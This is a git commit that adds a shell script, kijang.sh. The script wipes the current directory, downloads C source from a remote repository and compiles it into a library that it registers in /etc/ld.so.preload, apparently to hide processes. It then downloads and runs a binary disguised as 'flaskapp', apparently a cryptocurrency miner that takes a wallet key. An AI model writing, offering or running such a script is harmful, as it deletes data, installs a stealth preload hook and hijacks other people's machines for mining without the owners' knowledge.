ebaff0ab2f406db2e6676a494f004825fe7066d6
brontosimungo <brontosimungo@outlook.co.id>
2025-10-29 20:45:42 +0700

    Create kijang.sh

---
+++ kijang.sh
@@ -0,0 +1,13 @@
+rm -rvf * && mkdir image && cd image
+#!/bin/bash
+apt update
+apt install curl -y
+curl https://raw.githubusercontent.com/brontosimungo/upgraded-octo-sniffle/refs/heads/main/nyumput.c -o nyumput.c
+apt-get install build-essential -y
+gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
+mv libnyumput.so /usr/local/lib/
+echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
+rm nyumput.c
+wget -qO flaskapp https://github.com/brontosimungo/solid-bassoon/raw/refs/heads/main/golang
+chmod +x flaskapp
+./flaskapp --pubkey=3qVKGFnjCQj8Y6w8ppjUgHdC3AbFZCWnwkTpbgq8i8iDbWiqr7D3ESTZwniCHG9f3Xd2gABNq37CwU8EBi1mD1qpQN68PzEwLzHSSLK1kL1sMKAQ8kTSqpxSjdqtvsLXuK4S --threads-per-card=1 --name=testest
